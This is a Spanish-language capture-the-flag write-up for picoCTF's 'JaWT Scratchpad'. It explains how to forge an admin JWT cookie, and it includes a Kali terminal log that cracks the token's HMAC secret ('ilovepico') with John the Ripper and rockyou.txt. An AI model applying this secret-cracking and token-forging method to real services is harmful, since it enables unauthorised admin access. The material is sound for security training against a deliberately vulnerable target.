# JaWT Scratchpad

## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

## Pistas

| No. Pista | Pista                  |
| --------- | ---------------------- |
| 1         | What is that cookie?   |
| 2         | Have you heard of JWT? |


## Solucion
```
* Abrir en una pagina web de JSON tokens, puede ser esta https://jwt.io/ y en donde dice 'user' agregar el valor de admin y en donde dice 'verify signature' hay que agregaar el valor ilovepico
* Copiar el token y agregarlo al editor de cookies e la pagina del reto
* Recargamos 
```


## Notas adicionales
* Codigo para encontrar el valor de ilovepico
```bash
┌──(kali㉿kali)-[~]
└─$ nano hash           
                                                                                    
┌──(kali㉿kali)-[~]
└─$ cat hash           
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiUkNydXoifQ.2VAAOIK7onUrQwUfRgfdb4dXD-PexNlxda2HjaQia6E
                                                                                    
┌──(kali㉿kali)-[~]
└─$ ls /user/share/wordlists
ls: no se puede acceder a '/user/share/wordlists': No existe el fichero o el directorio
                                                                                    
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists 
amass  dirbuster      fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz
                                                                                    
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] contraseña para kali: 
                                                                                    
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                         
amass  dirbuster      fern-wifi  legion      nmap.lst     sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz
                                                                                    
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt         
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                                    
┌──(kali㉿kali)-[~]
└─$ john hash -w-/usr/share/wordlists/rockyou.txt
Created directory: /home/kali/.john
Unknown option: "-w-/usr/share/wordlists/rockyou.txt"
                                                                                    
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:04 DONE (2024-03-05 19:27) 0.2118g/s 1567Kp/s 1567Kc/s 1567KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Referencias